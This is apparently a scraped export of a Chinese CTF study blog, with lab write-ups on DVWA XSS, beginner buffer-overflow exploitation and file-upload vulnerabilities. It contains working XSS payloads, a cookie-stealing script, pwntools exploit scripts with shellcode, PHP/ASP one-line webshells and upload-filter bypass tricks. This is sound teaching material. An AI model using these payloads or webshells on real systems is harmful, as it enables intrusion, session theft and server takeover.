授权信息(License)。 eval() 把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。 var_dump() 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。 include() 获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。 show_source() 对文件进行语法高亮显示。 参考网站http://vinc.top/2016/09/28/%E3%80%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/https://lightless.me/archives/include-file-from-zip-or-phar.htmlhttps://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"WEB入门（四）","slug":"WEB入门（四）","date":"2018-07-08T01:08:01.000Z","updated":"2019-08-26T05:48:58.536Z","comments":true,"path":"2018/07/08/WEB入门（四）/","link":"","permalink":"qianfei11.coding.me/2018/07/08/WEB入门（四）/","excerpt":"涛哥带我学 XSS。","text":"涛哥带我学 XSS。 基础知识HTML一种超文本标记语言。其结构包括头部分（Head）和主体部分（Body），其中头部提供关于网页的信息，主体部分提供网页的具体内容。由 HTML 各类标签组成。 各类标签： 标签 功能 img 插入图片 body 文档的主体 iframe 在网页显示网页 Javascript一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为 JavaScript 引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在 HTML 网页上使用，用来给 HTML 网页增加动态功能。 cookie 与 session会话（Session）跟踪是 Web 程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是 Cookie 与 Session。Cookie 通过在客户端记录信息确定用户身份，Session 通过在服务器端记录信息确定用户身份。 WAFWeb 应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。国际上公认的一种说法是：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。 Javascript 弹框操作Javascript 函数内嵌实现形式：&lt;script&gt;Javascript的函数&lt;/script&gt; 相关函数： alert()：用于提示 confirm()：用于和用户交互确认 prompt()：弹框让用户输入信息 XSS跨站脚本攻击（cross site script execution），一种出现在 web 应用程序中的计算机安全漏洞。由于 web 应用对用户的输入过滤不严而产生。恶意攻击者通过 HTML 注入篡改网页，插入恶意脚本，从而控制用户浏览器行为的一种攻击方式。 危害 网络钓鱼，包括盗取各类的用户账号 窃取用户 cookie 强制弹出广告页面，刷流量 页面挂马 提升用户权限，进一步渗透网站 传播扩展脚本蠕虫 相比于 SQL 注入，SQL 注入是对后端的恶意篡改，而 XSS 是对前端的恶意攻击。 反射型 XSS也称为非持久性、参数型跨站脚本。主要用于将恶意的脚本附加到 URL 地址的参数中。 一般使用的已经构造好的恶意 URL 发送给受害者，诱使受害者点击触发，只执行一次。 存储型 XSS比反射型跨站脚本更具威胁，并且可能影响到 web 服务器的自身安全。 攻击者事先将恶意 JavaScript 代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。 绕过 XSS 限制 绕过magic_quotes_gpc（通过String.fromCharCode()函数） HEX 编码 改变大小写 关闭标签（&gt;&lt;script&gt;slert(&#39;xss&#39;);&lt;/script&gt;）（闭合前面的标签） 相关 PHP 函数 str_replace()：以其他字符替换字符串中的一些字符（区分大小写） addslashes()：在预定义字符（&#39;、&quot;、\\、NULL）之前添加反斜杠 stripslashes()：删除由addslashes()函数添加的反斜杠 trim()：移除字符串两侧的空白字符或其他预定义字符 htmlspecialchars()：把预定义的字符转换为 HTML 实体（&amp;（和号）成为&amp;；&quot;（双引号）成为&quot;；&#39;（单引号）成为 ‘；&lt;（小于）成为&lt;；&gt;（大于）成为&gt;） htmlspecialchars_decode()：把预定义的 HTML 实体转换为字符 mysql_real_escape_string()：对字符串中的特殊符号（\\x00、\\n、\\r、\\、&#39;、&quot;、\\x1a）进行转义 strip_tags()：剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用标签 DVWA 之 XSS今天在这里遇到了两个坑记录一下。 发现 Metasploitable 中的 DVWA 版本有点新，High Level 竟然就是 Impossible Level。最后还是用了以前 PHPSTUDY 里的旧版本来实验。 还有就是重置数据库的时候出现了无法删除 dvwa 数据库的错误。在命令行和图形界面都删除不了，最后直接去 mysql 目录下删除，才可以重置。 实验中主要根据源码分析被过滤的部分，寻找绕过的方法。 XSS Reflected（反射型 XSS）反射型相对简单一些。 Low源码： 1234567&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 这里显然对输入内容没有任何过滤。直接输入&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;就有弹窗回显。 Medium源码： 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 这里通过str_replace函数，将字符串&lt;script&gt;替换成空串，故只要双写或是大小写混用即可绕过。 构造 payload&lt;SCript&gt;alert(&#39;1&#39;)&lt;/script&gt;或者&lt;scri&lt;script&gt;pt&gt;alert(&#39;1&#39;)&lt;/script&gt;。 High源码： 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 源码中将所有的&lt;script&gt;完全过滤了（正则表达式中/i表示不区分大小写），使用&lt;script&gt;标签没有任何作用，所以需要通过其他方式。 在 HTML 的标签中，img、body、iframe 等标签的 src 注入恶意代码。payload 为：&lt;img src=1 onerror=alert(&quot;1&quot;) /&gt;（onerror事件会在文档或图像加载过程中发生错误时被触发。在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。） Impossible源码： 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里使用了htmlspecialchars()函数，将输入的恶意代码转换成 HTML 实体，完全过滤了恶意代码，无法进行攻击。 XSS Stored（存储型 XSS）存储型大多数存在留言板中，留言板又一般存在几个文本输入框。每个输入框都可以测试一下是否存在 XSS。 每次成功弹窗后，恶意代码都会被存储到数据库中，所以每次进入该页面都会出现之前的弹窗。 Low源码： 12345678910111213141516&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 源码中对 name 和 message 处的信息没有做任何过滤，故可以直接尝试 xss。 在 message 一栏直接输入&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;就可以出发弹窗。在 name 一栏中有字数长度限制，故用 burpsuite 抓包之后，再修改 name 栏中的字符串为&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;，放包后触发弹窗。 Medium源码： 12345678910111213141516 &lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = trim(strip_tags(addslashes($message))); $message = mysql_real_escape_string($message); $message = htmlspecialchars($message); // Sanitize name input $name = str_replace('&lt;script&gt;', '', $name); $name = mysql_real_escape_string($name); $query = \"INSERT INTO guestbook (comment,name) VALUES ('$message','$name');\"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );&#125;?&gt; 这里和前一题一样，通过str_replace函数，将字符串&lt;script&gt;替换成空串。 name 处可以继续通过抓包来进行 XSS。而 message 处输入的内容被htmlspecialchars()函数过滤，不存在 XSS。 High源码： 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 在 name 处和上一题的 high level 处是一样的漏洞。故虽然过滤了&lt;script&gt;，我们还是可以通过 HTML 的标签触发事件，引起弹窗。 Impossible源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 将 name 和 message 处输入的数据都经过htmlspecialchars()函数的处理，完全被过滤。 XSS 盗取 cookie攻击原理：通过 XSS 漏洞，利用一些 js 函数来获取用户信息。 先在网站根目录下放入如下 php 文件： 1234&lt;?php $cookie = $_GET['cookie']; file_put_contents('cookie.txt', $cookie)?&gt; PHP 文件中的&#39;很容易和中文的单引号‘搞混。 以下为 XSS 的 payload： 123&lt;script&gt; document.location=\"http://127.0.0.1/dvwa/cookie.php?cookie=\"+document.cookie;&lt;/script&gt; 输入 payload 后，在网站根目录下cookie.txt中存入了 cookie 的值。 BeEFThe Browser Exploitation Framework，一个著名的 XSS 利用框架，是一个交互界面友好、高度集成、开源的一个项目。BeEF 可以和 MSF 结合起来一起使用。 PS：MSF 是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 如何用 BeEF 进行客户端劫持： 在 Kali 下打开 BeEF 得到管理界面的 URL 和攻击 URL 利用 XSS 漏洞来访问攻击的 URL 参考网站http://www.freebuf.com/articles/web/123779.htmlhttps://www.cnblogs.com/andy-zhou/p/5360107.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"PWN入门（二）","slug":"PWN入门（二）","date":"2018-07-07T05:23:05.000Z","updated":"2019-08-26T05:53:21.579Z","comments":true,"path":"2018/07/07/PWN入门（二）/","link":"","permalink":"qianfei11.coding.me/2018/07/07/PWN入门（二）/","excerpt":"初涉 PWN。","text":"初涉 PWN。 关于 PWN 底层的原理栈帧平衡一些基本内容： ESP：栈指针寄存器，存放一个指针，该指针永远指向系统栈最上面的栈帧的栈顶 EBP：基址指针寄存器，该指针永远指向系统栈最上面的栈帧的底部 函数栈帧：ESP 和 EBP 之间内存空间为当前栈帧 在函数栈帧中一般包含以下几种信息： 局部变量：为函数举报变量开辟的内存空间 栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡得到） 函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置 如何保证栈帧平衡： 1234567PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧XXXXXX // 函数中间部分MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧 函数返回的步骤： 保存返回值，通常将函数的返回值保存在寄存器 EAX 中。 弹出当前帧，恢复上一个栈帧。具体包括： 在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。 将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。 将函数返回地址弹给 EIP 寄存器。 跳转：按照函数返回地址跳回母函数中继续执行。 PS：栈的守护天使——GS，也称作 Stack Canary/Cookie 调用函数（Call）CALL 可以化为两部分，即Push retaddr + Jump。先讲函数返回的地址入栈，再跳转到函数执行的位置处。 返回值（Ret）RET 也可以转化为两部分，即Pop retaddr + Jump。先是把返回值的地址出栈，再跳转回原本调用函数处。 缓冲区溢出（Buffer Overflow）缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。 缓冲区溢出原指当某个数据超过了处理程序限制的范围时，程序出现的异常操作。 尤其是 C 语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C 语言中的 C 标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。 Linux 下的 Pwn 常用命令 命令 功能 cd 进入文件夹 ls 列出当前目录下的所有文件 mkdir 创建文件夹 pwd 显示当前所在目录 chmod 改变文件使用权限 objdump 查看目标文件或者可执行的目标文件的构成 gdb 使用 gdb 进行调试 checksec 检测二进制的保护机制是否开启（peda 中的命令） Linux 下的 Pwn 常用到的工具 gdb：Linux 调试中必要用到的 gdb-peda：gdb 方便调试的工具，类似的工具有 gef，gdbinit，这些工具的安装可以参考：http://blog.csdn.net/gatieme/article/details/63254211 pwntools：写 exp 和 poc 的利器 checksec：可以很方便的知道 elf 程序的安全性和程序的运行平台 objdump 和 readelf：可以很快的知道 elf 程序中的关键信息 ida pro：强大的反编译工具 ROPgadget：强大的 rop 利用工具 one_gadget：可以快速的寻找 libc 中的调用 exec(‘bin/sh’)的位置 libc-database：可以通过泄露的 libc 的某个函数地址查出远程系统是用的哪个 libc 版本 gdb 基本命令 命令 功能 start 开始调试 pattc 生成规律字符串 patto 查找字符串 q 退出 n 执行一行源代码但不进入函数内部 ni 执行一行汇编代码但不进入函数内部 s 执行一行源代码而且进入函数内部 si 执行一行汇编代码而且进入函数内部 c 继续执行到下一个断点 b 下断点 stack 显示栈信息 x 按十六进制格式显示内存数据 r 运行代码 Pwntools 基本函数 函数 功能 process() sendline() 向目标发送一行字符串 interactive() 实现和程序之间的交互 remote() 远程连接 context() 设置运行时变量 p32()/p64() 把整数转化为 32/64 位的字符串 u32()/u64() 把 32/64 位字符串转化成整数 asm()/disasm() 快速汇编/反汇编 log() 输出消息 Pwn 的小练习第一次做 pwn 题，虽然是在有源码的情况下。但是还是被 pwn 的神奇所震撼。 p1程序源码： 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vmd()&#123; system(\"sh\");&#125;void A()&#123; char a[100]; scanf(\"%s\",a); return;&#125;int main()&#123; A();&#125; 输入gcc p1.c -o p1 -m32，用来编译 32 位的程序。 直接覆盖返回地址根据源文件可以判断该程序调用A()函数时，在 scanf 中没有对字符串的长度做限制，即存在缓冲区溢出。 根据源码，本题的思路应该为通过缓冲区溢出，将 RET 处的地址修改为cmd()函数的地址，直接跳转到该函数后 getshell。故先通过objdump命令寻找到 cmd 函数的地址 然后输入gdb p1进入 gdb 调试界面。start开始调试程序。 已知偏移量为 112 后，容易知道可以直接通过溢出在 RET 处覆盖原本的地址，直接跳至cmd()函数处。 payload 如下： 12345from pwn import *payload = \"A\" * 112 + \"\\x6b\\x84\\x04\\x08\"p = process(\"./p1\")p.sendline(payload)p.interactive() Ret_slide在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置 payload 减少尝试次数。即 RET 前的字符串利用其他 RET 地址来填充。 因为 RET 相当于 POP 和 JMP 两个步骤，每次 RET 都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。 payload： 12345from pwn import *payload = \"\\x08\\x04\\x84\\xa0\" * 28 + \"\\x6b\\x84\\x04\\x08\"p = process(\"./p1\")p.sendline(payload)p.interactive() 3-13程序源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A()&#123; setvbuf(stdout, 0, _IONBF, 0); srand(time(0) ^ getpid()); char buf[100]; int magic = rand(); gets(buf); if (atoi(buf) == magic) &#123; puts(\"Okay...\"); system(\"sh\"); &#125;&#125;int main()&#123; A();&#125; 同样输入gcc 3-13.c -o 3-13 -m32来编译。 调试一开始发现权限不够，通过chmod +x 3-13来获得可执行权限。 源代码中使用了gets()函数，存在缓存区溢出，故第一个想法应该就是通过对变量buf操作使其覆盖变量magic的值，使两者相同后得到 shell。 buf被定义为一个占 100 字节的字符串，而magic被定义为一个占 4 字节的整型。 根据调试过程可以知道，buf的地址为 0xffffcf68，而magic的地址为 0xffffcfcc。buf的地址比magic的地址更低，两者在栈中显然是先压入magic再压入buf。又因为输入数据是从低位向高位输入，那么我们可以通过变化buf的值来覆盖magic的值。最简单的方法显然是让两者都等于零。 根据以上的推测，那么输入字符串的长度应当至少为 100+4=104 字节才可能完全覆盖变量magic。 故 payload 为： 12345from pwn import *p = process('./3-13')payload = '\\0' * 104p.sendline(payload)p.interactive() 这里的\\0也就是\\x00，而如果输入的是字符0，转为十六进制后为\\x30，将不能满足条件，无法 getshell。 这题附上梅大佬的 payload，这里可以放 shellcode： 123456789101112from pwn import *offset=116r=process(\"3-13\")elf=ELF(\"3-13\")bss=elf.bss()get=elf.symbols['gets']shell=\"\\xeb\\x1b\\x5f\\x31\\xc0\\x6a\\x53\\x6a\\x18\\x59\\x49\\x5b\\x8a\\x04\\x0f\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x0f\\x50\\x85\\xc9\\x75\\xef\\xeb\\x05\\xe8\\xe0\\xff\\xff\\xff\\x1c\\x7f\\xc5\\xf9\\xbe\\xa3\\xe4\\xff\\xb8\\xff\\xb2\\xf4\\x1f\\x95\\x4e\\xfe\\x25\\x97\\x93\\x30\\xb6\\x39\\xb2\\x2c\"payload=\"A\"*offset+p32(get)+p32(bss)+p32(bss)r.sendline(payload)r.sendline(shell)r.sendline('/bin/sh')r.interactive() 参考网站https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BAhttps://paper.seebug.org/481/https://bbs.pediy.com/thread-212691.htmhttp://blog.xiyoulinux.org/detail.jsp?id=1965http://www.cnitblog.com/houcy/archive/2013/03/16/87075.htmlhttps://blog.csdn.net/qq_29343201/article/details/51337025http://www.91ri.org/14382.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"WEB入门（三）","slug":"WEB入门（三）","date":"2018-07-06T01:04:22.000Z","updated":"2019-08-26T05:49:07.865Z","comments":true,"path":"2018/07/06/WEB入门（三）/","link":"","permalink":"qianfei11.coding.me/2018/07/06/WEB入门（三）/","excerpt":"今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。","text":"今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。 文件上传漏洞上传的文件不进行限制，有可能会被利用于上传可执行文件、脚本到服务器上，并且通过脚本文件可以获得执行服务器端命令的能力 木马根据语言分类，有 PHP、ASP、JSP、ASP.NET 等不同语言下的木马；根据作用分类，有大马和小马。 PHP 一句话木马： &lt;?php ehco shell_exec($_GET[&#39;a&#39;]); ?&gt; &lt;?php ehco shell_exec($_POST[&#39;a&#39;]); ?&gt; &lt;?php @eval($_POST[&#39;a&#39;]); ?&gt; ASP 一句话木马： &lt;%eval request(&quot;Cknife&quot;)%&gt; ASP.NET 一句话木马： &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;Cknife&quot;],&quot;unsafe&quot;);%&gt; 利用函数 shell_exec(): 通过环境执行命令，并且将完整的输出以字符串的方式返回。 eval(): 把字符串作为 PHP 代码执行执行 a 接收到的内容。 phpinfo() 介绍 内容 语法 int phpinfo(void); 返回值 整数 函数种类 PHP 系统功能 phpinfo()会泄漏很多敏感的信息。 绝对路径（_SERVER[“script_FILENAME”]） 找到 phpinfo()可以直接找到网站的绝对路径。 支持的程序 可以查看一些特殊的程序服务，诸如 redis、memcache、mysql、SMTP、curl。要是服务器装了 redis 或者 memcache，就可以通过 ssrf 来 getshell。 泄漏真实 ip（_SERVER[“SERVER_ADDR”]或者 SERVER_ADDR） 得到的 ip 可以直接用来查旁站和 c 段。 GOPHER 如果支持 gopher 也能直接用 ssrf。 fastcgi 查看是否开启 fastcgi 和查看 fastcgi 的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。 泄漏缓存文件地址（_FILES[“file1”]） 向 phpinfo()post 一个 shell 后，可以在”_FILE[“file1”]”中看到上传的临时文件，如果有个 LFI，便可以直接 getshell。 一些敏感配置 allow_url_include：远程文件包含 disable_functions：查看金庸函数 open_basedir：读取一些没权限的目录 还能获取一些环境信息，如 environment 中的 path、log 等。 Linux 基本命令 ls：列出当前目录下所有文件 pwd：查看文件当前目录 Cknife（菜刀）超级强大的网站管理工，分为客户端和代码两部分 只要将那简短的一句话代码放到网站上去就可以取得网站的权限 运行环境：安装了 JRE1.7+环境的所有操作系统 主要功能：文件管理、虚拟终端、数据库管理 DVWA 之 File Uploadlow level 的测试一下，源码中没有对任何文件格式进行过滤： 写出一句话木马 用菜刀连接的一句话木马： 1&lt;?php @eval($_POST['a']; ?&gt; 直接在网页下通过 GET 的一句话木马： 1&lt;?php echo shell_exec($_GET['a']); ?&gt; 在网页下用 hackbar 通过 POST 的一句话木马： 1&lt;?php echo shell_exec($_POST['a']); ?&gt; 上传一句话木马直接在网页查到文件 Cknife 连接 源码： 123456789101112131415161718 &lt;?php if (isset($_POST['Upload'])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\"; //上传路径为../../hackable/uploads/ $target_path = $target_path . basename( $_FILES['uploaded']['name']); //上传路径加上上传的文件名 if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; //对是否上传成功做出判断，因此所有格式的文件都能上传 echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125;?&gt; 文件上传漏洞检测 客户端 javascript 检测：通常在本地检测文件的扩展名 服务端 MIME 类型检测：通常检测的是 Content-Type 内容 服务端目录路径检测：通常根 path 参数相关的内容 服务端文件扩展名检测：通常检测跟文件 extension 相关的内容 服务端文件内容检测：检测文件内容是否合法或含有恶意代码 客户端 javascript 检测在客户端使用 js 对不合法图片进行检查 绕过： 禁用页面 js 先把文件改成符合条件的文件格式上传，在抓包，修改文件的后缀名 服务端检测绕过（MIME 类型检测）通过判断$_FILES[&#39;userfile&#39;][&#39;type&#39;]!=&quot;imgae/gif&quot;来保证上传的文件类型为 gif 绕过：通过 burp 抓包，将原来的 Content-Type 类型改为符合要求的类型 1Content-Type: application/octet-stream application/octet-stream即为 php 文件的文件类型格式 服务端目录路径检测上传路径为/image/20160704时，可以通过修改为image/20160704/eval.php%00filename.gif 通过%00 截断最终导致存储的文件名为eval.php 服务端文件扩展名检测分为黑名单检测和白名单检测 黑名单检测接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传 绕过： 后缀名大小写绕过，例如：将 Burpsuite 截获的数据包中的文件名evil.php改evil.php 名单列表绕过，尝试使用非黑名单内的后缀名，如 php5，php7 等 特殊文件名绕过（只适用 windows，将文件名改为evil.php.或evil.php（注意这里有一个空格)。在 windows 下，不允许这样的命名，所以会将.和空格自动去掉）。 0x00 截断绕过：在上传的时候，当文件系统读到 0x00 时，会认为文件已经结束。例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件 白名单检测接收上传的文件做扩展名匹配，匹配上的白名单中的扩展名的文件才能上传 绕过： 0x00 阶段绕过 解析漏洞绕过 （1）apache 解析文件名是从右到左识别扩展名，如eval.php.jpg，文件为 php 文件，不能解析 jpg 会向前解析 php （2）IIS6.0 目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照 asp 解析。 （3）IIS6.0 不解析;后面的，所以提交evil.asp;.html解析为 asp 类型 （4）Nginx 解析漏洞：将 php 文件换成其他可以通过的文件后缀，访问的时候在后面加上eval.php.jpg，如evil.jpg/.php，evil.jpg会解析为 php 的格式 服务端文件内容检测 图像类文件内容检测 文件幻数检测（图片头格式检测） jpg 内容头 value = FF D8 FF E0 00 10 4A 46 49 46 gif 内容头 value = 47 49 46 38 39 61 png 内容头 value = 89 50 4E 47 绕过：在文件头后加上一句话木马就能绕过 Upload-Labs分别对客户端 javascript 检测、服务端 MIME 类型检测、服务端目录路径检测三种不同类型的绕过进行练习。 这里有个坑。经过潘大佬的测试，上传文件超过了文件大小 php.ini 中即系统设定的大小。php.ini 中的配置原本为upload_max_filesize = 2M，修改为upload_max_filesize = 20M。然后就可以上传文件了。 pass-01源码： 123456789101112131415161718192021function checkFile() &#123; var file = document.getElementsByName(\"upload_file\")[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 可以知道此处的过滤是通过 javascript 实现的，在开发者工具中禁用 js 就可以上传木马 pass-02源码： 12345678910111213141516$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || 